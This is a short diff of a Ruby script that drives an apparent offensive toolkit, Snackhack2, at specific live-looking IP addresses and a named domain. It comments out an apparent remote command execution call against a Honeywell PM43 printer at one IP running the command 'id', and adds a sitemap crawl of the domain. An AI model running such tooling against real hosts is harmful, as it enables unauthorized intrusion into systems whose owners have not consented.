@@ -113,9 +113,12 @@ wp.all_in_one_seo
 =end
 
 # Snackhack2::BannerGrabber.new("http://95.142.29.235").apache2
-
+=begin
 s = Snackhack2::HoneywellPM43.new("http://81.84.149.129:80")
 
 s.command = "id"
 puts s.command
 s.run
+=end
+ sm = Snackhack2::SiteMap.new("https://cryptogrinders.us")
+ sm.run
